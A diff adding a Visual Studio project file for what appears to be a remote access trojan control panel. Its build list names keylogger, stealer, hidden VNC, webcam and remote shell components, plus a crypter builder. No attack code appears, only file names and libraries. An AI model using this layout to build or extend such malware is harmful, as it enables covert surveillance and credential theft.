@@ -1,0 +1,451 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{01585921-762F-429A-BA2F-A5DD13FB5BB1}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <AssemblyName>HQ</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <ApplicationVersion>0.0.0.0</ApplicationVersion>
+    <FileAlignment>512</FileAlignment>
+    <RootNamespace>InvokedServer</RootNamespace>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="BouncyCastle.Crypto">
+      <HintPath>lib\BouncyCastle.Crypto.dll</HintPath>
+    </Reference>
+    <Reference Include="ComponentFactory.Krypton.Navigator">
+      <HintPath>lib\ComponentFactory.Krypton.Navigator.dll</HintPath>
+    </Reference>
+    <Reference Include="ComponentFactory.Krypton.Toolkit">
+      <HintPath>lib\ComponentFactory.Krypton.Toolkit.dll</HintPath>
+    </Reference>
+    <Reference Include="Gma.System.MouseKeyHook">
+      <HintPath>lib\Gma.System.MouseKeyHook.dll</HintPath>
+    </Reference>
+    <Reference Include="Guna.UI2">
+      <HintPath>lib\Guna.UI2.dll</HintPath>
+    </Reference>
+    <Reference Include="Mono.Cecil">
+      <HintPath>lib\Mono.Cecil.dll</HintPath>
+    </Reference>
+    <Reference Include="Open.Nat">
+      <HintPath>lib\Open.Nat.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Vestris.ResourceLib">
+      <HintPath>lib\Vestris.ResourceLib.dll</HintPath>
+    </Reference>
+    <Reference Include="dnlib">
+      <HintPath>lib\dnlib.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Forms\FrmBuilder.Designer.cs">
+      <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmCertificate.Designer.cs">
+      <DependentUpon>FrmCertificate.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmConnections.Designer.cs">
+      <DependentUpon>FrmConnections.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmFileManager.Designer.cs">
+      <DependentUpon>FrmFileManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmHiddenBrowser.Designer.cs">
+      <DependentUpon>FrmHiddenBrowser.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmHVNC.Designer.cs">
+      <DependentUpon>FrmHVNC.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmHVNCBrowserOptions.Designer.cs">
+      <DependentUpon>FrmHVNCBrowserOptions.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmKeylogger.Designer.cs">
+      <DependentUpon>FrmKeylogger.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmMain.Designer.cs">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmPasswordRecovery.Designer.cs">
+      <DependentUpon>FrmPasswordRecovery.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmPlugins.Designer.cs">
+      <DependentUpon>FrmPlugins.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRegistryEditor.Designer.cs">
+      <DependentUpon>FrmRegistryEditor.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditBinary.Designer.cs">
+      <DependentUpon>FrmRegValueEditBinary.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditMultiString.Designer.cs">
+      <DependentUpon>FrmRegValueEditMultiString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditString.Designer.cs">
+      <DependentUpon>FrmRegValueEditString.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditWord.Designer.cs">
+      <DependentUpon>FrmRegValueEditWord.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteDesktop.Designer.cs">
+      <DependentUpon>FrmRemoteDesktop.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteExecution.Designer.cs">
+      <DependentUpon>FrmRemoteExecution.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteShell.Designer.cs">
+      <DependentUpon>FrmRemoteShell.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteWebcam.Designer.cs">
+      <DependentUpon>FrmRemoteWebcam.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmResetSurvival.Designer.cs">
+      <DependentUpon>FrmResetSurvival.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmReverseProxy.Designer.cs">
+      <DependentUpon>FrmReverseProxy.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmSettings.Designer.cs">
+      <DependentUpon>FrmSettings.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmShowMessagebox.Designer.cs">
+      <DependentUpon>FrmShowMessagebox.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmStartupAdd.Designer.cs">
+      <DependentUpon>FrmStartupAdd.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmStartupManager.Designer.cs">
+      <DependentUpon>FrmStartupManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmStealerOptions.Designer.cs">
+      <DependentUpon>FrmStealerOptions.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmSystemInformation.Designer.cs">
+      <DependentUpon>FrmSystemInformation.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmTaskManager.Designer.cs">
+      <DependentUpon>FrmTaskManager.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Forms\FrmVisitWebsite.Designer.cs">
+      <DependentUpon>FrmVisitWebsite.cs</DependentUpon>
+    </Compile>
+    <Compile Include="Program.cs" />
+    <Compile Include="Utilities\FrameUpdatedEventArgs.cs" />
+    <Compile Include="Utilities\FrameUpdatedEventHandler.cs" />
+    <Compile Include="Utilities\FrameCounter.cs" />
+    <Compile Include="Utilities\ListViewColumnSorter.cs" />
+    <Compile Include="Utilities\NativeMethods.cs" />
+    <Compile Include="Utilities\NoIpUpdater.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyClient.cs" />
+    <Compile Include="ReverseProxy\ReverseProxyServer.cs" />
+    <Compile Include="Registry\RegValueHelper.cs" />
+    <Compile Include="Properties\Resources.cs" />
+    <Compile Include="Properties\Settings.cs" />
+    <Compile Include="Networking\BufferPool.cs" />
+    <Compile Include="Networking\Client.cs" />
+    <Compile Include="Networking\QuasarServer.cs" />
+    <Compile Include="Networking\Server.cs" />
+    <Compile Include="Networking\UPnPService.cs" />
+    <Compile Include="Networking\UserState.cs" />
+    <Compile Include="Models\BuilderProfile.cs" />
+    <Compile Include="Models\BuildOptions.cs" />
+    <Compile Include="Models\DummyCertificate.cs" />
+    <Compile Include="Models\FileManagerListTag.cs" />
+    <Compile Include="Models\FileTransfer.cs" />
+    <Compile Include="Models\Settings.cs" />
+    <Compile Include="Messages\ClientInfoSummaryHandler.cs" />
+    <Compile Include="Messages\ClientStatusHandler.cs" />
+    <Compile Include="Messages\FileManagerHandler.cs" />
+    <Compile Include="Messages\HVNCHandler.cs" />
+    <Compile Include="Messages\KeyloggerHandler.cs" />
+    <Compile Include="Messages\PasswordRecoveryHandler.cs" />
+    <Compile Include="Messages\PluginViewerHandler.cs" />
+    <Compile Include="Messages\RegistryHandler.cs" />
+    <Compile Include="Messages\RemoteDesktopHandler.cs" />
+    <Compile Include="Messages\RemoteShellHandler.cs" />
+    <Compile Include="Messages\RemoteWebcamHandler.cs" />
+    <Compile Include="Messages\ResetSurvivalHandler.cs" />
+    <Compile Include="Messages\ReverseProxyHandler.cs" />
+    <Compile Include="Messages\StartupManagerHandler.cs" />
+    <Compile Include="Messages\StealerLogQueueClass.cs" />
+    <Compile Include="Messages\StealerHandler.cs" />
+    <Compile Include="Messages\SystemInformationHandler.cs" />
+    <Compile Include="Messages\TaskManagerHandler.cs" />
+    <Compile Include="Messages\TcpConnectionsHandler.cs" />
+    <Compile Include="Helper\CertificateHelper.cs" />
+    <Compile Include="Helper\ClipboardHelper.cs" />
+    <Compile Include="Helper\NativeMethodsHelper.cs" />
+    <Compile Include="Helper\WindowHelper.cs" />
+    <Compile Include="Helper\Zip.cs" />
+    <Compile Include="Forms\FrmBuilder.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmCertificate.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmConnections.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmFileManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmHiddenBrowser.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmHVNC.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmHVNCBrowserOptions.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmKeylogger.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmMain.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmPasswordRecovery.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmPlugins.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRegistryEditor.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditBinary.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditMultiString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditString.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRegValueEditWord.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteDesktop.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteExecution.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteShell.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmRemoteWebcam.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmResetSurvival.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmReverseProxy.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmSettings.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmShowMessagebox.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmStartupAdd.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmStartupManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmStealerOptions.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmSystemInformation.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmTaskManager.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Forms\FrmVisitWebsite.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Extensions\ListViewExtensions.cs" />
+    <Compile Include="Extensions\RegistryKeyExtensions.cs" />
+    <Compile Include="Enums\PluginStatus.cs" />
+    <Compile Include="Enums\TransferType.cs" />
+    <Compile Include="Enums\WordType.cs" />
+    <Compile Include="DataStructs\HVNCImageDataStruct.cs" />
+    <Compile Include="DataStructs\StealerLog.cs" />
+    <Compile Include="Controls\DotNetBarTabControl.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\IhvncPictureBox.cs" />
+    <Compile Include="Controls\hvncPictureBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\InputBox.cs" />
+    <Compile Include="Controls\Line.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\AeroListView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\IRapidPictureBox.cs" />
+    <Compile Include="Controls\RapidPictureBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\RegistryTreeView.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\RegistryValueLstItem.cs" />
+    <Compile Include="Controls\WordTextBox.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\HexEditor\ByteCollection.cs" />
+    <Compile Include="Controls\HexEditor\Caret.cs" />
+    <Compile Include="Controls\HexEditor\EditView.cs" />
+    <Compile Include="Controls\HexEditor\HexEditor.cs">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include="Controls\HexEditor\HexViewHandler.cs" />
+    <Compile Include="Controls\HexEditor\IKeyMouseEventHandler.cs" />
+    <Compile Include="Controls\HexEditor\StringViewHandler.cs" />
+    <Compile Include="Build\ClientBuilder.cs" />
+    <Compile Include="Build\CrypterBuilder.cs" />
+    <Compile Include="Build\CrypterEncryption.cs" />
+    <Compile Include="Build\Renamer.cs" />
+    <Compile Include="AssemblyInfo.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Forms\FrmBuilder.resx">
+      <DependentUpon>FrmBuilder.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmCertificate.resx">
+      <DependentUpon>FrmCertificate.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmConnections.resx">
+      <DependentUpon>FrmConnections.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmFileManager.resx">
+      <DependentUpon>FrmFileManager.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmHiddenBrowser.resx">
+      <DependentUpon>FrmHiddenBrowser.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmHVNC.resx">
+      <DependentUpon>FrmHVNC.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmHVNCBrowserOptions.resx">
+      <DependentUpon>FrmHVNCBrowserOptions.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmKeylogger.resx">
+      <DependentUpon>FrmKeylogger.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmMain.resx">
+      <DependentUpon>FrmMain.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmPasswordRecovery.resx">
+      <DependentUpon>FrmPasswordRecovery.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmPlugins.resx">
+      <DependentUpon>FrmPlugins.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRegistryEditor.resx">
+      <DependentUpon>FrmRegistryEditor.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRegValueEditBinary.resx">
+      <DependentUpon>FrmRegValueEditBinary.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRegValueEditMultiString.resx">
+      <DependentUpon>FrmRegValueEditMultiString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRegValueEditString.resx">
+      <DependentUpon>FrmRegValueEditString.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRegValueEditWord.resx">
+      <DependentUpon>FrmRegValueEditWord.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRemoteDesktop.resx">
+      <DependentUpon>FrmRemoteDesktop.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRemoteExecution.resx">
+      <DependentUpon>FrmRemoteExecution.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRemoteShell.resx">
+      <DependentUpon>FrmRemoteShell.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmRemoteWebcam.resx">
+      <DependentUpon>FrmRemoteWebcam.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmResetSurvival.resx">
+      <DependentUpon>FrmResetSurvival.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmReverseProxy.resx">
+      <DependentUpon>FrmReverseProxy.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmSettings.resx">
+      <DependentUpon>FrmSettings.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmShowMessagebox.resx">
+      <DependentUpon>FrmShowMessagebox.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmStartupAdd.resx">
+      <DependentUpon>FrmStartupAdd.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmStartupManager.resx">
+      <DependentUpon>FrmStartupManager.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmStealerOptions.resx">
+      <DependentUpon>FrmStealerOptions.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmSystemInformation.resx">
+      <DependentUpon>FrmSystemInformation.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmTaskManager.resx">
+      <DependentUpon>FrmTaskManager.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Forms\FrmVisitWebsite.resx">
+      <DependentUpon>FrmVisitWebsite.cs</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Properties\Resources.resx" />
+  </ItemGroup>
+  <ItemGroup>
+    <ProjectReference Include="InvokedCommon\InvokedCommon.csproj">
+      <Project>{467046a7-a9ca-439d-bcf4-10ce2913ea5f}</Project>
+      <Name>InvokedCommon</Name>
+    </ProjectReference>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+  <PropertyGroup>
+    <PostBuildEvent>if not exist "$(TargetDir)\Plugins" md "$(TargetDir)\Plugins"
+del $(TargetDir)\Plugins\InvokedCommon.dll /s /q
+copy $(TargetDir)\InvokedCommon.dll $(TargetDir)\Plugins\</PostBuildEvent>
+  </PropertyGroup>
+</Project>
